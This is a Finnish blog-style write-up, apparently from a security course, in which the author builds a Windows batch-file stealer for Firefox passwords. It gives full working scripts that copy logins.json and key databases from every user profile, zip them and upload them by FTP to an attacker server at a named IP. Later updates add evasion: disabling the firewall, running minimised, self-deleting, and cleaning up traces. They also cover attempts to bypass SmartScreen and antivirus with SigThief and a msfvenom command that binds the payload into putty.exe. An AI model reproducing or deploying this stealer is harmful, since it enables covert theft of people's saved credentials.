# Firefox salasanojen varastus

## Esittely
Käytin salasanojen varastamiseen yksinkertaista .bat tiedostoa, joka käytti powershelliä ja FTP.exeä Firefox salasana tiedostojen kopioimiseen ja lähettämiseen, sekä VSFTPD:tä tiedostojen vastaanottoon.
## Selitys
Aloitin luomalla varas.bat nimisen tiedoston, johon lisäsin notepadilla rivin:
```
mkdir C:\salasanat\
```
Testasin, että ohjelma pystyy luomaan kyseisen kansion C:\ levyn alkuun ja se onnistui.  
Tämä jälkeen tutkin missä tiedostossa Firefox säilyttää salasanoja.  
Firefox tallentaa käyttäjätunnukset ja salasanat logins.json nimiseen tiedostoon, mutta kryptaa ne kevyesti. Kryptauksen avaimen firefox hakee tiedostosta key3.db, jossa numero ilmeisesti vaihtelee.  
Kummatkin tiedostot löytyvät Polusta: C:\Users\(käyttäjänimi)\AppData\Roaming\Mozilla\Firefox\Profiles\(profiilinimi.satunnainenkoodi)\  
Koska polussa on vaihtelevia merkkejä, niin käytin powershell komentoa, johon voi tähdellä merkata kohdat, joista valitaan kaikki.
Lisäsin siis rivi ohjelmaan pätkät:
```
powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\logins.json -Destination C:\salasanat\
powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\key*.db -Destination C:\salasanat\
```
Näin ohjelma osaa kopioida tiedostot vaikka polussa ja tiedoston nimessä olevat tekstit vaihtelisivatki koneittain.  

Tämän jälkeen käytin powershelliä, jotta sain tiedostot pakattua yhdeksi nätiksi zip tiedostoksi.
```
powershell Compress-Archive -Path C:\salasanat -DestinationPath C:\salasanat\salasanat.zip
```
Seuraavaksi vastassa oli tiedostojen lähettäminen hallintapalvelimelle, jossa tiedostot voidaan purkaa selkolukuisiksi.  
Päätin käyttää ftp.exeä, koska se on Windowsissa valmiiksi mukana.  
  
Koska käytän FTP:tä, niin pitää hallintapalvelimellani olla myös palvelu, joka osaa vastaanottaa FTP:n kautta tiedostoja.  
Asensin siis Kali Linuxiini VSFTPD ohjelman, joka toimii FTP palvelimena.  
Ohjelma asentui nätisti komennolla:
```
sudo apt-get -y install vsftpd
```
Tämän jälkeen tutkin miten palvelimelle saisi lähetettyä tiedostoja nopeasti ilman, että siihen tarvitsee kirjautua.  
Korvasin VSFTPD:n oletus konfiguraation omallani, joka sallii vain anonyymit yhteydet ja rajoittaa FTP tiedostojen lähettämisen vain yhteen tiedosto polkuun /tmp/sala kansioon.  
Konfiguraatio näytti kokonaisuudessaan tältä:
```
listen=YES
anonymous_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_root=/tmp/sala
#
pasv_enable=YES
pasv_promiscuous=YES
log_ftp_protocol=YES
```
Nyt pystyin lähettämään tiedostoja FTP:n kautta kansioon /tmp/sala  
Jouduin kuitenkin korjaamaan hieman kansioiden oikeuksia, jotta tiedostoja pystyi oikeasti kirjoittamaan kyseiseen polkuun.  
Aluksi loin /tmp/ kansioon kyseisen tiedosto sala, johon annoin omistajuuden ftp käyttäjälle ja vain luku oikeudet komennolla:
```
sudo chown -R ftp:nogroup /tmp/sala
sudo chmod 555 -R /tmp/sala
```
Kokeilin yhteyttä ja tiedoston lähettämistä Kalilla FileZillalla. Yhteys aukesi nätisti, mutta tiedostoa en saanut lähetettyä, vaan FileZilla valitti ettei ole oikeutta kirjoittaa kansioon.  
Pienen tutkinna jälkeen selvisi, että VSFTPD ei anna kirjoittaa käyttäjälle annettuun juuri polkuun ja kansiolla ei edes ollut kirjoitus oikeuksia.

Tein siis uuden kansion sala kansion alle, jonka nimesin "salasanat".  
Siirsin salasanat kansion oikeudet ftp käyttäjälle ja annoin tälle kansiolle kirjoitusoikeudetkin komennoilla:
```
sudo chown -R ftp:nogroup /tmp/sala/salasanat
sudo chmod 755 -R /tmp/sala/salasanat
```
Nyt FileZilla pystyi lähettämään tiedoston nätisti salasanat kansioon.  
  
Seuraavaksi siirryin taas Windowsin puolelle tutkimaan ftp.exeä.  
  
Ftp.exen käyttö bat tiedoston kautta komentoja antamalla toimii heikosti, mutta onneksi se tukee myös scripti tiedostojen käyttöä.  
Koska haluan kohteen pyörittävän ja lataavan vain yhden tiedoston, niin tein ftp:lle scriptin bat tiedoston kautta.  
Scriptin pitää siis avata ftp yhteys, asettaa oikeat lähetys parametrit ja lähettää tiedosto.  
Tutkin hetken miten ftp.exe toimii ja selvitin millä komennoilla saan salasanat.zip tiedoston lähetettyä.  
Lähettäminen osoittautui haastavaksi erinäisten virheiden takia, sekä yhteyden avaus ensimmäistä kertaa avaa windowsin palomuurin, joka kysyy sallitaanko yhteys. Palaan tutkimaan palomuuria myöhemmin.  
Pisimpään painin lähettämisen aikana tapahtuneen virheen takia:
```
500 Illegal PORT command.
425 Use PORT or PASV first.
```
Pitkään tutkittuani ja turhia vastauksia saatuani löysin ketjun, jossa kävi ilmi, että VirtualBox kone ei osaa lähettää tiedostoa FTP:n kautta, jos koneella on verkkoasetuksissa NAT päällä. Muutin VirtualBoxin asetuksista yhteyden tilan Bridged Ethernet eli sillattuun tilaan, jonka jälkeen tiedoston lähetys onnistui.  
Seuraavaksi siirryin tekemään scriptiä, jolla tiedoston lähetys onnistuu.  
Skripti itsessään näytti lopulta tältä:
```
open *palvelimen-osoite*
anonymous
asd
cd salasanat
quote pasv
binary
send C:\salasanat\salasanat.zipt
quit
```
Yhteys avattiin open *ip-osoite* komennolla, jonka jälkeen palvelin kysyi käyttäjätunnusta.  
Käyttäjätunnukseksi annoin anonymous ja salasanaksi asd, koska mikä tahansa salasana käy anonymous käyttäjällä ja olin sallinut palvelimellani anonyymit käyttäjät.  
Tämän jälkeen navigoin yhteyden juuresta salasanat kansioon.  
Quote pasv määrittää yhteyden muodoksi passiivisen.  
Binary määrää, että tiedostot lähetetään binääri muodossa.  
Lopulta send lähettää tiedoston ja quit sulkee ftp yhteyden ja ohjelman.  
  
Kun scripti ja sen vaiheet olivat valmiit kokeilin pyöräyttää sen komennolla:
```
ftp -s:temp.txt
```
Scripti toimi niinkuin pitääkin ja tiedostot tulivat automaattisesti palvelimelleni.  
  
Seuraavaksi siirryin tekemään kyseisen scripti tiedoston .bat tiedoston kautta.  
Komennot oli helppo tehdä uuteen tekstitiedostoon nimeltään temp.txt seuraavilla komennoilla:  
```
@echo off
echo open 127.0.0.1> temp.txt
echo anonymous>> temp.txt
echo asd >> temp.txt
echo cd salasanat>> temp.txt
echo quote pasv>> temp.txt
echo binary>> temp.txt
echo send C:\salasanat\salasanat.zip>> temp.txt
echo quit>> temp.txt
```

Nyt pystyin lisäämään .bat tiedostoon tuon scriptin pyöräytys komennon: ftp -s:temp.txt  
Kokeilin pyöräyttää koko scriptin uudestaan poistettuani kaikki liittyneet kansiot palvelimeltani ja kohde koneelta.  
Se toimi mainiosti. Scripti kopioi nyt salasana tiedostot ja lähettää ne automaattisesti.  
Lisäsin scriptin loppuun vielä kohdat del temp.txt ja del varas.bat, jolloin scripti tuhoaa itsensä pyörittämisen jälkeen.  
Tuhoaminen onnistui nätisti normaaleilla oikeuksilla, mutta administrator oikeuksilla pyöirrätessä suoritus polku muuttuu kansioon system32, jolloin scripti ei löydä omia tiedostojaan. Tämän pyrin korjaamaan myöhemmin rakentamalla asentajan, jonka mukana scripti tulee ja laittamalla tiedostot system32 kansioon.  

Päätin lisätä vielä scriptiin vielä komennot joilla palomuuri avattaisiin FTP:n osalta, jottei aikaisemmin tullutta palomuuri kehoitusta tulisi. Tein tämän komennolla:
```
netsh advfirewall firewall add rule name="FTP" dir=in action=allow program=%SystemRoot\System32\ftp.exe enable=yes protocol=tcp
netsh advfirewall firewall add rule name="FTP" dir=in action=allow program=%SystemRoot\System32\ftp.exe enable=yes protocol=udp
netsh advfirewall firewall add rule name="FTP" dir=OUT action=allow program=%SystemRoot\System32\ftp.exe enable=yes protocol=tcp
netsh advfirewall firewall add rule name="FTP" dir=OUT action=allow program=%SystemRoot\System32\ftp.exe enable=yes protocol=udp
```
Nämä komennot tosin vaativat scriptin pyörittämistä administrator oikeuksilla kohde koneessa. Aikaisemmat pätkät toimivat ilman näitä oikeuksiakin.  
Kokonaisuudessaan scripti näyttää nyt siis tältä:
```
mkdir C:\salasanat\
netsh advfirewall firewall add rule name="FTP" dir=in action=allow program=%SystemRoot\System32\ftp.exe enable=yes protocol=tcp
netsh advfirewall firewall add rule name="FTP" dir=in action=allow program=%SystemRoot\System32\ftp.exe enable=yes protocol=udp
netsh advfirewall firewall add rule name="FTP" dir=OUT action=allow program=%SystemRoot\System32\ftp.exe enable=yes protocol=tcp
netsh advfirewall firewall add rule name="FTP" dir=OUT action=allow program=%SystemRoot\System32\ftp.exe enable=yes protocol=udp
powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\logins.json -Destination C:\salasanat\
powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\key*.db -Destination C:\salasanat\
powershell Compress-Archive -Path C:\salasanat -DestinationPath C:\salasanat\salasanat.zip
@echo off
echo open 127.0.0.1> temp.txt
echo anonymous>> temp.txt
echo asd >> temp.txt
echo cd salasanat>> temp.txt
echo quote pasv>> temp.txt
echo binary>> temp.txt
echo send C:\salasanat\salasanat.zip>> temp.txt
echo quit>> temp.txt
ftp -s:temp.txt
del temp.txt
del varas.bat
```

Scripti toimi kokonaisuudessaan loistavasti ja tiedostot tulivat perille nätisti.  
Päätin vielä kuitenkin kokeilla scriptiä täysin puhtaalla koneella.  
Puhtaalla koneella ajettaessa palomuuri kysyi kuitenkin yhteyden avauksen yhteydessä, että sallitaanko yhteys. Tekemäni poikkeukset eivät siis vaikuttaneet tähän vielä.  
Virustorjunnoista kumpikaan ei kuitenkaan valittanut tästä scriptistä yhtään, vaan antoivat sen mennä läpi sellaisenaan. Eli virustorjunnan ohitus on onnistunut.  
Jatkan vielä tutkimista miten tuon palomuurin promptin saisi estettyä, jotta ohjelma pysyisi stealthimpana.  

### Päivitys 24.10.2018

#### Palomuuri promptin ohitus.
Palomuuri promptin ohitus olikin melko yksinkertainen.  
Käytin .batissa vain palomuurin sulkemiskomentoa:
```
netsh advfirewall set allprofiles state off
```
Käytin komentoa juuri ennen kuin ftp yhteys avataan ja kun tiedosto on lähetetty, niin laitan palomuurin takaisin päälle komennolla:
```
netsh advfirewall set allprofiles state on
```
  
Kokonaisuudessaan toimiva .bat näyttää nyt siis tältä:
```
mkdir C:\salasanat\
powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\logins.json -Destination C:\salasanat\
powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\key*.db -Destination C:\salasanat\
powershell Compress-Archive -Path C:\salasanat -DestinationPath C:\salasanat\salasanat.zip
@echo off
echo open 172.28.171.247> temp.txt
echo anonymous>> temp.txt
echo asd >> temp.txt
echo cd salasanat>> temp.txt
echo quote pasv>> temp.txt
echo binary>> temp.txt
echo send C:\salasanat\salasanat.zip>> temp.txt
echo quit>> temp.txt
netsh advfirewall set allprofiles state off
ftp -s:temp.txt
netsh advfirewall set allprofiles state on
del temp.txt
del varas.bat
```
Päätin vielä lisäillä muutaman kohdan, jotta .bat poistaa itsensä ja pysyy minimized tilassa ollakseen huomaamaton.  
Lisäsin batin alkuun kohdan:
```
@echo off
if "%1"=="done" goto runtime
start "" /min %0 done
exit

:runtime
```
Tämä aloittaa batin, mutta avaa itsensä uudelleen pienennettynä. Näin ollen se todennäköisesti herättää vähemmän huomiota.  
  
Lisäksi laitoin .batin tuhoamaan itsensä ja poistamaan kaikki tiedostot, joita se loi salasanojen lähettämistä varten komennolla:
```
del C:\salasanat /S /F /Q
rmdir /s /q C:\salasanat
DEL "%~f0" && EXIT
```
Tässä del /S /F /Q poistaa pakotetusti ja hiljaisesti kaikki tiedostot C:\salasanat sisältä, jonne aikaisemmin kopioitiin firefoxin salasana tiedostot ja jossa on myös tuo pakattu salasanat.zip tiedosto.  
Seuraava rivi rmdir poistaa hiljaisesti tuon tyhjän salasanat kansion.  
Viimeinen rivi poistaa bat tiedoston itsensä ja sulkee samalla komentorivin.  
Kokonaisuudessaan .bat näyttää nyt siis tältä:
```
@echo off
if "%1"=="done" goto runtime
start "" /min %0 done
exit

:runtime
mkdir C:\salasanat\
powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\logins.json -Destination C:\salasanat\
powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\key*.db -Destination C:\salasanat\
powershell Compress-Archive -Path C:\salasanat -DestinationPath C:\salasanat\salasanat.zip
@echo off
echo open 172.28.171.247> temp.txt
echo anonymous>> temp.txt
echo asd >> temp.txt
echo cd salasanat>> temp.txt
echo quote pasv>> temp.txt
echo binary>> temp.txt
echo send C:\salasanat\salasanat.zip>> temp.txt
echo quit>> temp.txt
netsh advfirewall set allprofiles state off
ftp -s:temp.txt
netsh advfirewall set allprofiles state on
del temp.txt
del C:\salasanat /S /F /Q
rmdir /s /q C:\salasanat
DEL "%~f0" && EXIT
```

### Päivitys 02.11.2018
Kokeilin saada ohitettua Windowsin SmartScreenin SigThief nimisellä python scriptillä, joka kopio signaturen aidosta exestä ja liittää sen toiseen exeen.  
Tämä ei tuottanut tulosta ainakaan SteamSetup.exe:stä otetulla signaturella. IE.exe valittikin, että tiedostossa on korruptoitunut allekirjoitus, mutta FireFox latasi tiedoston ilman turhia mutinoita.
SigThiefin repository löytyy täältä: https://github.com/secretsquirrel/SigThief


### Päivitys 05.11.2018

Koitin lisätä haittaohjelman puttyyn kiinni, jos olisin päässyt smartscreenistä ohi sen tiedoilla ratsastamalla. Käytin myös shikata_ga_nai enkoodausta.  
Valitettavasti smartscreen huomasi kuitenkin tämän ratsastuksen ja silti pyöritettäessä sekä avast, että kaspersky havaitsi myös generic/custom payloadin exessä ja esti sen.  
Komento jota koitin käyttää ohittamiseen:
```
sudo msfvenom --payload generic/custom PAYLOADFILE=/home/anon/haittaohjelma/varasPerus.exe -a x64 --template putty.exe --keep -f exe -e x86/shikata_ga_nai -i 56 --out puttyVaras.exe```








